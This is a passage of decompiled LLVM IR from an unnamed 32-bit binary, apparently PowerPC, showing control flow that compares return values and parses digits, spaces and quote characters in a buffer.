  %v4_100014c4 = call i32 @function_1000ac30(i32 %v0_100014b4, i32 %v0_100014b8, i32 %v0_100014bc, i32 1)
  %v1_100014c8 = load i32, i32* %r23.global-to-local, align 4
  %v2_100014c8 = add i32 %v1_100014c8, %v4_100014c4
  store i32 %v2_100014c8, i32* %r3.global-to-local, align 4
  %v0_100014cc = load i32, i32* @r31, align 4
  %v1_100014cc = trunc i32 %v0_100014cc to i8
  %v3_100014cc = add i32 %v2_100014c8, 2116
  %v4_100014cc = inttoptr i32 %v3_100014cc to i8*
  store i8 %v1_100014cc, i8* %v4_100014cc, align 1
  br label %dec_label_pc_100014d0

dec_label_pc_100014d0:                            ; preds = %dec_label_pc_10001478, %dec_label_pc_100014b4
  %v0_100014d0 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_100014d0, i32* @r3, align 4
  store i32 16, i32* %r4.global-to-local, align 4
  store i32 268440796, i32* @lr, align 4
  %v2_100014d8 = call i32 @function_1000ac8c(i32 %v0_100014d0, i32 16)
  store i32 %v2_100014d8, i32* %r3.global-to-local, align 4
  %v3_100014dc = icmp eq i32 %v2_100014d8, 0
  br i1 %v3_100014dc, label %dec_label_pc_10001b70, label %dec_label_pc_100014e4

dec_label_pc_100014e4:                            ; preds = %dec_label_pc_100014d0
  %v1_100014e4 = add i32 %v2_100014d8, 2
  %v1_100014e8 = load i32, i32* @r30, align 4
  %v2_100014e8 = add i32 %v1_100014e8, 931
  %v3_100014e8 = inttoptr i32 %v2_100014e8 to i32*
  store i32 %v1_100014e4, i32* %v3_100014e8, align 4
  br label %dec_label_pc_10001364

dec_label_pc_100014f0:                            ; preds = %dec_label_pc_10000860
  store i32 ptrtoint (i32* @global_var_100014f8.41 to i32), i32* @lr, align 4
  %v0_100014f4 = call i32 @function_1000b3f0()
  store i32 %v0_100014f4, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_100014fc = load i32, i32* %r29.global-to-local, align 4
  %v1_100014fc = trunc i32 %v0_100014fc to i8
  %v2_100014fc = load i32, i32* @r30, align 4
  %v3_100014fc = add i32 %v2_100014fc, -529
  %v4_100014fc = inttoptr i32 %v3_100014fc to i8*
  store i8 %v1_100014fc, i8* %v4_100014fc, align 1
  %v0_10001500 = load i32, i32* %r0.global-to-local, align 4
  %v1_10001500 = load i32, i32* @r30, align 4
  %v2_10001500 = add i32 %v1_10001500, -533
  %v3_10001500 = inttoptr i32 %v2_10001500 to i32*
  store i32 %v0_10001500, i32* %v3_10001500, align 4
  br label %dec_label_pc_10000824

dec_label_pc_10001508:                            ; preds = %dec_label_pc_10000be8
  %v0_10001508 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10001508, i32* @r3, align 4
  %v0_1000150c = load i32, i32* @r31, align 4
  store i32 %v0_1000150c, i32* %r4.global-to-local, align 4
  store i32 268440852, i32* %lr.global-to-local, align 4
  %v2_10001510 = inttoptr i32 %v0_10001508 to i8*
  %v3_10001510 = call i32 @function_1000ab8c(i8* %v2_10001510, i32 %v0_1000150c)
  store i32 %v3_10001510, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10000c00

dec_label_pc_10001518:                            ; preds = %dec_label_pc_1000081c
  store i32 268440860, i32* %lr.global-to-local, align 4
  %v0_10001518 = call i32 @function_1000bb0c()
  store i32 %v0_10001518, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v0_10001518, i32* @r31, align 4
  br label %dec_label_pc_10001524

dec_label_pc_10001524:                            ; preds = %dec_label_pc_10001544.dec_label_pc_10001524_crit_edge, %dec_label_pc_10001518
  %v1_10001524 = phi i32 [ %v1_10001524.pre, %dec_label_pc_10001544.dec_label_pc_10001524_crit_edge ], [ %v0_10001518, %dec_label_pc_10001518 ]
  %v0_10001524 = phi i32 [ %v0_10001524.pre, %dec_label_pc_10001544.dec_label_pc_10001524_crit_edge ], [ 0, %dec_label_pc_10001518 ]
  %v2_10001524 = inttoptr i32 %v1_10001524 to i32*
  store i32 %v0_10001524, i32* %v2_10001524, align 4
  %v0_10001528 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10001528, i32* %r4.global-to-local, align 4
  %v0_10001534 = load i32, i32* @r30, align 4
  %v1_10001534 = add i32 %v0_10001534, -533
  %v2_10001534 = inttoptr i32 %v1_10001534 to i32*
  %v3_10001534 = load i32, i32* %v2_10001534, align 4
  store i32 %v3_10001534, i32* %r3.global-to-local, align 4
  store i32 268440892, i32* @lr, align 4
  %v4_10001538 = call i32 @function_1000c090(i32 %v3_10001534, i32 %v0_10001528, i32 10240, i32 16384)
  store i32 %v4_10001538, i32* %r3.global-to-local, align 4
  %v3_1000153c = icmp eq i32 %v4_10001538, 0
  br i1 %v3_1000153c, label %dec_label_pc_100017e0, label %dec_label_pc_10001544

dec_label_pc_10001544:                            ; preds = %dec_label_pc_10001524
  %v1_10001544 = icmp slt i32 %v4_10001538, -1
  %v2_10001544 = icmp sgt i32 %v4_10001538, -1
  %v3_10001544 = icmp eq i32 %v4_10001538, -1
  store i1 %v1_10001544, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001544, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001544, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001544, label %dec_label_pc_1000154c, label %dec_label_pc_10001544.dec_label_pc_10001524_crit_edge

dec_label_pc_10001544.dec_label_pc_10001524_crit_edge: ; preds = %dec_label_pc_10001544
  %v0_10001524.pre = load i32, i32* %r29.global-to-local, align 4
  %v1_10001524.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10001524

dec_label_pc_1000154c:                            ; preds = %dec_label_pc_10001544
  %v0_1000154c = load i32, i32* @r31, align 4
  %v1_1000154c = inttoptr i32 %v0_1000154c to i32*
  %v2_1000154c = load i32, i32* %v1_1000154c, align 4
  store i32 %v2_1000154c, i32* %r0.global-to-local, align 4
  %v1_10001550 = icmp slt i32 %v2_1000154c, 11
  %v2_10001550 = icmp sgt i32 %v2_1000154c, 11
  %v3_10001550 = icmp eq i32 %v2_1000154c, 11
  store i1 %v1_10001550, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001550, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001550, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001550, label %dec_label_pc_1000190c, label %dec_label_pc_10001558

dec_label_pc_10001558:                            ; preds = %dec_label_pc_1000154c, %dec_label_pc_100017e0
  %v0_10001558 = load i32, i32* @r30, align 4
  %v1_10001558 = add i32 %v0_10001558, -533
  %v2_10001558 = inttoptr i32 %v1_10001558 to i32*
  %v3_10001558 = load i32, i32* %v2_10001558, align 4
  store i32 %v3_10001558, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10001560.42 to i32), i32* @lr, align 4
  %v0_1000155c = call i32 @function_1000b3f0()
  store i32 %v0_1000155c, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v1_10001568 = load i32, i32* @r30, align 4
  %v2_10001568 = add i32 %v1_10001568, -533
  %v3_10001568 = inttoptr i32 %v2_10001568 to i32*
  store i32 -1, i32* %v3_10001568, align 4
  %v0_1000156c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000156c = trunc i32 %v0_1000156c to i8
  %v2_1000156c = load i32, i32* @r30, align 4
  %v3_1000156c = add i32 %v2_1000156c, -529
  %v4_1000156c = inttoptr i32 %v3_1000156c to i8*
  store i8 %v1_1000156c, i8* %v4_1000156c, align 1
  br label %dec_label_pc_10000824

dec_label_pc_10001574:                            ; preds = %dec_label_pc_10001140, %dec_label_pc_1000111c
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 37, i32* %r3.global-to-local, align 4
  store i32 268440960, i32* %lr.global-to-local, align 4
  %v3_1000157c = call i32 @function_1000a238(i32 37, i32* null)
  %v0_10001580 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10001580, i32* %r4.global-to-local, align 4
  %v0_10001588 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10001588, i32* %r3.global-to-local, align 4
  store i32 268440976, i32* %lr.global-to-local, align 4
  %v3_1000158c = inttoptr i32 %v0_10001588 to i8*
  %v4_1000158c = call i32 @function_1000af14(i8* %v3_1000158c, i32 %v0_10001580, i32 %v3_1000157c)
  store i32 %v4_1000158c, i32* %r3.global-to-local, align 4
  %v1_10001590 = icmp slt i32 %v4_1000158c, -1
  %v2_10001590 = icmp sgt i32 %v4_1000158c, -1
  %v3_10001590 = icmp eq i32 %v4_1000158c, -1
  store i1 %v1_10001590, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001590, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001590, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001590, label %dec_label_pc_1000177c, label %dec_label_pc_10001598

dec_label_pc_10001598:                            ; preds = %dec_label_pc_10001574
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 37, i32* %r3.global-to-local, align 4
  store i32 268440996, i32* %lr.global-to-local, align 4
  %v3_100015a0 = call i32 @function_1000a238(i32 37, i32* null)
  %v0_100015a4 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_100015a4, i32* %r4.global-to-local, align 4
  %v0_100015ac = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_100015ac, i32* %r3.global-to-local, align 4
  store i32 268441012, i32* %lr.global-to-local, align 4
  %v3_100015b0 = inttoptr i32 %v0_100015ac to i8*
  %v4_100015b0 = call i32 @function_1000af14(i8* %v3_100015b0, i32 %v0_100015a4, i32 %v3_100015a0)
  store i32 %v4_100015b0, i32* %r3.global-to-local, align 4
  %v0_100015b8 = load i32, i32* %r18.global-to-local, align 4
  %v2_100015b8 = add i32 %v0_100015b8, %v4_100015b0
  store i32 %v2_100015b8, i32* %r9.global-to-local, align 4
  %v1_100015bc = add i32 %v2_100015b8, 10532
  %v2_100015bc = inttoptr i32 %v1_100015bc to i8*
  %v3_100015bc = load i8, i8* %v2_100015bc, align 1
  %v4_100015bc = zext i8 %v3_100015bc to i32
  store i32 %v4_100015bc, i32* %r0.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v1_100015c8 = xor i32 %v4_100015bc, 32
  %v1_100015cc = sub nsw i32 0, %v1_100015c8
  %v2_100015cc = xor i32 %v4_100015bc, -33
  %v4_100015cc = icmp uge i32 %v2_100015cc, %v1_100015cc
  %v2_100015d0 = zext i1 %v4_100015cc to i32
  %v3_100015d0 = add i32 %v2_100015d0, %v4_100015b0
  store i32 %v3_100015d0, i32* %r11.global-to-local, align 4
  %v0_100015d4 = load i32, i32* %r20.global-to-local, align 4
  %v2_100015d4 = add i32 %v3_100015d0, %v0_100015d4
  store i32 %v2_100015d4, i32* @r28, align 4
  store i32 %v2_100015d4, i32* %r3.global-to-local, align 4
  %v1_100015dc = load i32, i32* %r24.global-to-local, align 4
  %v2_100015dc = sub i32 %v1_100015dc, %v3_100015d0
  store i32 %v2_100015dc, i32* %r4.global-to-local, align 4
  store i32 %v3_100015d0, i32* %r31.global-to-local, align 4
  store i32 268441064, i32* %lr.global-to-local, align 4
  %v5_100015e4 = call i32 @function_1000ac30(i32 %v2_100015d4, i32 %v2_100015dc, i32 ptrtoint ([3 x i8]* @global_var_1000de34.24 to i32), i32 2)
  store i32 %v5_100015e4, i32* %r3.global-to-local, align 4
  %v1_100015e8 = icmp slt i32 %v5_100015e4, -1
  %v2_100015e8 = icmp sgt i32 %v5_100015e4, -1
  %v3_100015e8 = icmp eq i32 %v5_100015e4, -1
  store i1 %v1_100015e8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100015e8, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100015e8, i1* %cr7_eq.global-to-local, align 1
  store i32 %v5_100015e4, i32* %r27.global-to-local, align 4
  br i1 %v3_100015e8, label %dec_label_pc_1000177c, label %dec_label_pc_100015f4

dec_label_pc_100015f4:                            ; preds = %dec_label_pc_10001598
  %v1_100015f4 = icmp slt i32 %v5_100015e4, 1
  %v2_100015f4 = icmp sgt i32 %v5_100015e4, 1
  %v3_100015f4 = icmp eq i32 %v5_100015e4, 1
  store i1 %v1_100015f4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100015f4, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100015f4, i1* %cr7_eq.global-to-local, align 1
  %tmp82 = icmp slt i32 %v5_100015e4, 2
  br i1 %tmp82, label %dec_label_pc_10001600, label %dec_label_pc_100015fc

dec_label_pc_100015fc:                            ; preds = %dec_label_pc_100015f4
  %v1_100015fc = add i32 %v5_100015e4, -2
  store i32 %v1_100015fc, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_10001600

dec_label_pc_10001600:                            ; preds = %dec_label_pc_100015f4, %dec_label_pc_100015fc
  %v1_10001608 = phi i32 [ %v5_100015e4, %dec_label_pc_100015f4 ], [ %v1_100015fc, %dec_label_pc_100015fc ]
  %v0_10001600 = load i32, i32* %r18.global-to-local, align 4
  %v1_10001600 = load i32, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10001600 = add i32 %v0_10001600, %v1_10001608
  %v2_10001608 = add i32 %v2_10001600, %v1_10001600
  store i32 %v2_10001608, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v3_10001610 = add i32 %v2_10001608, 10532
  %v4_10001610 = inttoptr i32 %v3_10001610 to i8*
  store i8 0, i8* %v4_10001610, align 1
  %v0_10001614 = load i32, i32* @r28, align 4
  store i32 %v0_10001614, i32* %r4.global-to-local, align 4
  %v0_10001618 = load i32, i32* %r11.global-to-local, align 4
  %v1_10001618 = load i32, i32* @r1, align 4
  %v2_10001618 = add i32 %v1_10001618, 8
  %v3_10001618 = inttoptr i32 %v2_10001618 to i32*
  store i32 %v0_10001618, i32* %v3_10001618, align 4
  %v0_1000161c = load i32, i32* %r20.global-to-local, align 4
  %v1_1000161c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000161c = add i32 %v1_1000161c, %v0_1000161c
  %v3_1000161c = inttoptr i32 %v2_1000161c to i8*
  %v4_1000161c = load i8, i8* %v3_1000161c, align 1
  %v5_1000161c = zext i8 %v4_1000161c to i32
  store i32 %v5_1000161c, i32* %r3.global-to-local, align 4
  %v1_10001620 = add nuw nsw i32 %v5_1000161c, 208
  %v1_10001624 = urem i32 %v1_10001620, 256
  store i32 %v1_10001624, i32* %r0.global-to-local, align 4
  %v1_10001628 = icmp ult i32 %v1_10001624, 9
  %v2_10001628 = icmp ugt i32 %v1_10001624, 9
  %v3_10001628 = icmp eq i32 %v1_10001624, 9
  store i1 %v1_10001628, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001628, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001628, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10001628, label %dec_label_pc_10001658, label %dec_label_pc_10001630

dec_label_pc_10001630:                            ; preds = %dec_label_pc_10001600
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10001634

dec_label_pc_10001634:                            ; preds = %dec_label_pc_10001634, %dec_label_pc_10001630
  %v0_10001634 = phi i32 [ %v0_1000163c, %dec_label_pc_10001634 ], [ 0, %dec_label_pc_10001630 ]
  %v1_10001634 = add i32 %v0_10001634, 1
  store i32 %v1_10001634, i32* %r11.global-to-local, align 4
  %v1_10001638 = load i32, i32* @r1, align 4
  %v2_10001638 = add i32 %v1_10001638, 8
  %v3_10001638 = inttoptr i32 %v2_10001638 to i32*
  store i32 %v1_10001634, i32* %v3_10001638, align 4
  %v0_1000163c = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000163c, i32* %r9.global-to-local, align 4
  %v1_10001640 = load i32, i32* @r28, align 4
  %v2_10001640 = add i32 %v1_10001640, %v0_1000163c
  %v3_10001640 = inttoptr i32 %v2_10001640 to i8*
  %v4_10001640 = load i8, i8* %v3_10001640, align 1
  %v5_10001640 = zext i8 %v4_10001640 to i32
  store i32 %v5_10001640, i32* %r3.global-to-local, align 4
  %v1_10001644 = add nuw nsw i32 %v5_10001640, 208
  %v1_10001648 = urem i32 %v1_10001644, 256
  store i32 %v1_10001648, i32* %r0.global-to-local, align 4
  %v1_1000164c = icmp ult i32 %v1_10001648, 9
  %v2_1000164c = icmp ugt i32 %v1_10001648, 9
  %v3_1000164c = icmp eq i32 %v1_10001648, 9
  store i1 %v1_1000164c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_1000164c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_1000164c, i1* %cr7_eq.global-to-local, align 1
  %tmp83 = icmp ult i32 %v1_10001648, 10
  br i1 %tmp83, label %dec_label_pc_10001634, label %dec_label_pc_10001654

dec_label_pc_10001654:                            ; preds = %dec_label_pc_10001634
  store i32 %v2_10001640, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10001658

dec_label_pc_10001658:                            ; preds = %dec_label_pc_10001600, %dec_label_pc_10001654
  %v0_10001658 = phi i32 [ %v5_1000161c, %dec_label_pc_10001600 ], [ %v5_10001640, %dec_label_pc_10001654 ]
  %v2_10001658 = icmp ne i32 %v0_10001658, 0
  %v3_10001658 = icmp eq i32 %v0_10001658, 0
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001658, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001658, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001658, label %dec_label_pc_1000177c, label %dec_label_pc_10001660

dec_label_pc_10001660:                            ; preds = %dec_label_pc_10001658
  store i32 0, i32* %r26.global-to-local, align 4
  %v2_10001664 = load i32, i32* %r4.global-to-local, align 4
  %v3_10001664 = inttoptr i32 %v2_10001664 to i8*
  store i8 0, i8* %v3_10001664, align 1
  %v0_10001668 = load i32, i32* @r1, align 4
  %v1_10001668 = add i32 %v0_10001668, 8
  %v2_10001668 = inttoptr i32 %v1_10001668 to i32*
  %v3_10001668 = load i32, i32* %v2_10001668, align 4
  %v1_1000166c = add i32 %v3_10001668, 1
  store i32 %v1_1000166c, i32* %r11.global-to-local, align 4
  store i32 %v1_1000166c, i32* %v2_10001668, align 4
  %v0_10001674 = load i32, i32* @r28, align 4
  %v1_10001674 = load i32, i32* %r11.global-to-local, align 4
  %v2_10001674 = add i32 %v1_10001674, %v0_10001674
  %v3_10001674 = inttoptr i32 %v2_10001674 to i8*
  %v4_10001674 = load i8, i8* %v3_10001674, align 1
  %v5_10001674 = zext i8 %v4_10001674 to i32
  store i32 %v5_10001674, i32* %r0.global-to-local, align 4
  %v1_10001678 = icmp ult i8 %v4_10001674, 32
  %v2_10001678 = icmp ugt i8 %v4_10001674, 32
  %v3_10001678 = icmp eq i8 %v4_10001674, 32
  store i1 %v1_10001678, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001678, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001678, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001678, label %dec_label_pc_10001b84, label %dec_label_pc_10001680

dec_label_pc_10001680:                            ; preds = %dec_label_pc_10001660, %dec_label_pc_10001b84
  %v1_10001680 = phi i32 [ %v1_10001674, %dec_label_pc_10001660 ], [ %v1_10001680.pre, %dec_label_pc_10001b84 ]
  %v0_10001680 = phi i32 [ %v0_10001674, %dec_label_pc_10001660 ], [ %v0_10001680.pre, %dec_label_pc_10001b84 ]
  %v2_10001680 = add i32 %v0_10001680, %v1_10001680
  store i32 %v2_10001680, i32* %r29.global-to-local, align 4
  store i32 %v2_10001680, i32* %r3.global-to-local, align 4
  store i32 268441228, i32* @lr, align 4
  %v1_10001688 = inttoptr i32 %v2_10001680 to i8*
  %v2_10001688 = call i32 @function_1000ab64(i8* %v1_10001688)
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1000de6c.43 to i32), i32* %r31.global-to-local, align 4
  store i32 %v2_10001688, i32* %r4.global-to-local, align 4
  %v0_1000169c = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1000169c, i32* %r3.global-to-local, align 4
  store i32 268441252, i32* %lr.global-to-local, align 4
  %v4_100016a0 = inttoptr i32 %v0_1000169c to i8*
  %v5_100016a0 = call i32 @function_1000af14(i8* %v4_100016a0, i32 %v2_10001688, i32 ptrtoint ([5 x i8]* @global_var_1000de6c.43 to i32))
  store i32 %v5_100016a0, i32* %r3.global-to-local, align 4
  %v1_100016a4 = icmp slt i32 %v5_100016a0, -1
  %v2_100016a4 = icmp sgt i32 %v5_100016a0, -1
  %v3_100016a4 = icmp eq i32 %v5_100016a0, -1
  store i1 %v1_100016a4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100016a4, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100016a4, i1* %cr7_eq.global-to-local, align 1
  %v0_100019cc = load i32, i32* @r1, align 4
  %v1_100019cc = add i32 %v0_100019cc, 8
  %v2_100019cc = inttoptr i32 %v1_100019cc to i32*
  %v3_100019cc = load i32, i32* %v2_100019cc, align 4
  br i1 %v3_100016a4, label %dec_label_pc_100019cc, label %dec_label_pc_100016ac

dec_label_pc_100016ac:                            ; preds = %dec_label_pc_10001680
  %v0_100016b0 = load i32, i32* @r28, align 4
  %v2_100016b0 = add i32 %v0_100016b0, %v3_100019cc
  store i32 %v2_100016b0, i32* %r29.global-to-local, align 4
  store i32 %v2_100016b0, i32* %r3.global-to-local, align 4
  store i32 268441276, i32* @lr, align 4
  %v1_100016b8 = inttoptr i32 %v2_100016b0 to i8*
  %v2_100016b8 = call i32 @function_1000ab64(i8* %v1_100016b8)
  %v0_100016bc = load i32, i32* %r31.global-to-local, align 4
  store i32 %v2_100016b8, i32* %r4.global-to-local, align 4
  %v0_100016c4 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_100016c4, i32* %r3.global-to-local, align 4
  store i32 268441292, i32* %lr.global-to-local, align 4
  %v4_100016c8 = inttoptr i32 %v0_100016c4 to i8*
  %v5_100016c8 = call i32 @function_1000af14(i8* %v4_100016c8, i32 %v2_100016b8, i32 %v0_100016bc)
  store i32 %v5_100016c8, i32* %r3.global-to-local, align 4
  %v0_100016cc = load i32, i32* @r1, align 4
  %v1_100016cc = add i32 %v0_100016cc, 8
  %v2_100016cc = inttoptr i32 %v1_100016cc to i32*
  %v3_100016cc = load i32, i32* %v2_100016cc, align 4
  %v2_100016d0 = add i32 %v3_100016cc, %v5_100016c8
  store i32 %v2_100016d0, i32* %r11.global-to-local, align 4
  store i32 %v2_100016d0, i32* %v2_100016cc, align 4
  %v0_100016d8 = load i32, i32* @r28, align 4
  %v1_100016d8 = load i32, i32* %r11.global-to-local, align 4
  %v2_100016d8 = add i32 %v1_100016d8, %v0_100016d8
  %v3_100016d8 = inttoptr i32 %v2_100016d8 to i8*
  %v4_100016d8 = load i8, i8* %v3_100016d8, align 1
  %v5_100016d8 = zext i8 %v4_100016d8 to i32
  store i32 %v5_100016d8, i32* %r0.global-to-local, align 4
  %v1_100016dc = icmp ult i8 %v4_100016d8, 34
  %v2_100016dc = icmp ugt i8 %v4_100016d8, 34
  %v3_100016dc = icmp eq i8 %v4_100016d8, 34
  store i1 %v1_100016dc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100016dc, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100016dc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100016dc, label %dec_label_pc_100016ac.dec_label_pc_100019dc_crit_edge, label %dec_label_pc_100016e4

dec_label_pc_100016ac.dec_label_pc_100019dc_crit_edge: ; preds = %dec_label_pc_100016ac
  %v1_100019e4.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_100019dc

dec_label_pc_100016e4:                            ; preds = %dec_label_pc_100019cc, %dec_label_pc_100019dc, %dec_label_pc_100016ac, %dec_label_pc_10001a00
  %v0_100016e4 = load i32, i32* @r28, align 4
  store i32 %v0_100016e4, i32* @r3, align 4
  store i32 10, i32* %r4.global-to-local, align 4
  store i32 268441328, i32* @lr, align 4
  %v2_100016ec = call i32 @function_1000ac8c(i32 %v0_100016e4, i32 10)
  store i32 %v2_100016ec, i32* %r3.global-to-local, align 4
  %v1_100016f0 = add i32 %v2_100016ec, -1
  store i32 %v1_100016f0, i32* %r0.global-to-local, align 4
  %v1_100016f4 = icmp ult i32 %v1_100016f0, 8
  %v2_100016f4 = icmp ugt i32 %v1_100016f0, 8
  %v3_100016f4 = icmp eq i32 %v1_100016f0, 8
  store i1 %v1_100016f4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100016f4, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100016f4, i1* %cr7_eq.global-to-local, align 1
  %v0_100016f8 = load i32, i32* @r1, align 4
  %v1_100016f8 = add i32 %v0_100016f8, 20792
  %v2_100016f8 = inttoptr i32 %v1_100016f8 to i32*
  %v3_100016f8 = load i32, i32* %v2_100016f8, align 4
  store i32 %v3_100016f8, i32* %r0.global-to-local, align 4
  %v2_100016fc = add i32 %v3_100016f8, %v2_100016ec
  store i32 %v2_100016fc, i32* @r31, align 4
  %tmp84 = icmp ult i32 %v1_100016f0, 9
  br i1 %tmp84, label %dec_label_pc_10001710.preheader, label %dec_label_pc_10001720

dec_label_pc_10001710.preheader:                  ; preds = %dec_label_pc_100016e4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268441368, i32* @lr, align 4
  %v0_100017144 = call i32 @function_1000b7c0()
  store i32 %v0_100017144, i32* %r3.global-to-local, align 4
  %v1_100017185 = load i32, i32* @r31, align 4
  %v2_100017186 = icmp ult i32 %v0_100017144, %v1_100017185
  %v3_100017187 = icmp ugt i32 %v0_100017144, %v1_100017185
  %v4_100017188 = icmp eq i32 %v0_100017144, %v1_100017185
  store i1 %v2_100017186, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100017187, i1* %cr7_gt.global-to-local, align 1
  store i1 %v4_100017188, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_100017186, label %dec_label_pc_10001708, label %dec_label_pc_10001720.loopexit

dec_label_pc_10001708:                            ; preds = %dec_label_pc_10001710.preheader, %dec_label_pc_10001708
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10001710.44 to i32), i32* @lr, align 4
  %v1_1000170c = call i32 @function_1000cce4(i32 1)
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268441368, i32* @lr, align 4
  %v0_10001714 = call i32 @function_1000b7c0()
  store i32 %v0_10001714, i32* %r3.global-to-local, align 4
  %v1_10001718 = load i32, i32* @r31, align 4
  %v2_10001718 = icmp ult i32 %v0_10001714, %v1_10001718
  %v3_10001718 = icmp ugt i32 %v0_10001714, %v1_10001718
  %v4_10001718 = icmp eq i32 %v0_10001714, %v1_10001718
  store i1 %v2_10001718, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001718, i1* %cr7_gt.global-to-local, align 1
  store i1 %v4_10001718, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10001718, label %dec_label_pc_10001708, label %dec_label_pc_10001720.loopexit

dec_label_pc_10001720.loopexit:                   ; preds = %dec_label_pc_10001708, %dec_label_pc_10001710.preheader
  %v0_10001720.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_10001720

dec_label_pc_10001720:                            ; preds = %dec_label_pc_10001720.loopexit, %dec_label_pc_100016e4
  %v0_10001720 = phi i32 [ %v0_10001720.pre, %dec_label_pc_10001720.loopexit ], [ %v0_100016f8, %dec_label_pc_100016e4 ]
  %v1_10001720 = add i32 %v0_10001720, 8
  %v2_10001720 = inttoptr i32 %v1_10001720 to i32*
  %v3_10001720 = load i32, i32* %v2_10001720, align 4
  store i32 %v3_10001720, i32* %r29.global-to-local, align 4
  %v0_10001724 = load i32, i32* @r28, align 4
  %v2_10001724 = add i32 %v0_10001724, %v3_10001720
  store i32 %v2_10001724, i32* @r31, align 4
  store i32 %v2_10001724, i32* %r3.global-to-local, align 4
  store i32 268441392, i32* @lr, align 4
  %v1_1000172c = inttoptr i32 %v2_10001724 to i8*
  %v2_1000172c = call i32 @function_1000ab64(i8* %v1_1000172c)
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 %v2_1000172c, i32* %r4.global-to-local, align 4
  %v0_1000173c = load i32, i32* @r31, align 4
  store i32 %v0_1000173c, i32* %r3.global-to-local, align 4
  store i32 268441412, i32* %lr.global-to-local, align 4
  %v4_10001740 = inttoptr i32 %v0_1000173c to i8*
  %v5_10001740 = call i32 @function_1000af14(i8* %v4_10001740, i32 %v2_1000172c, i32 ptrtoint ([5 x i8]* @global_var_1000de64.40 to i32))
  store i32 %v5_10001740, i32* %r3.global-to-local, align 4
  %v1_10001744 = icmp slt i32 %v5_10001740, 4
  %v2_10001744 = icmp sgt i32 %v5_10001740, 4
  %v3_10001744 = icmp eq i32 %v5_10001740, 4
  store i1 %v1_10001744, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001744, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001744, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001744, label %dec_label_pc_10001af0, label %dec_label_pc_1000174c

dec_label_pc_1000174c:                            ; preds = %dec_label_pc_10001720
  %v0_1000174c = load i32, i32* @r28, align 4
  %v1_1000174c = load i32, i32* %r29.global-to-local, align 4
  %v2_1000174c = add i32 %v1_1000174c, %v0_1000174c
  %v3_1000174c = inttoptr i32 %v2_1000174c to i8*
  %v4_1000174c = load i8, i8* %v3_1000174c, align 1
  %v5_1000174c = zext i8 %v4_1000174c to i32
